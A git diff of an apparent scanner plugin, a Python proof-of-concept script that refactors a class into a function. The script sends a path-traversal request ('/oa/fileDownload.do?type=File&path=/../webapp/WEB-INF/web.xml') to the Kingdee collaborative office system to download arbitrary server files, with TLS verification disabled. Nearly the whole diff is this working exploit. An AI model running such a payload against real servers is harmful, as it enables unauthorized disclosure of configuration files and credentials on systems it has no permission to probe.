@@ -9,17 +9,10 @@ description: 金蝶协同办公系统/oa/fileDownload.do文件参数path未校�
 import sys
 import requests
 import warnings
-
-
-
-class filedownload:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['金蝶办公系统任意文件下载','','']
         payload = "/oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,5 @@ class filedownload:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = filedownload(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
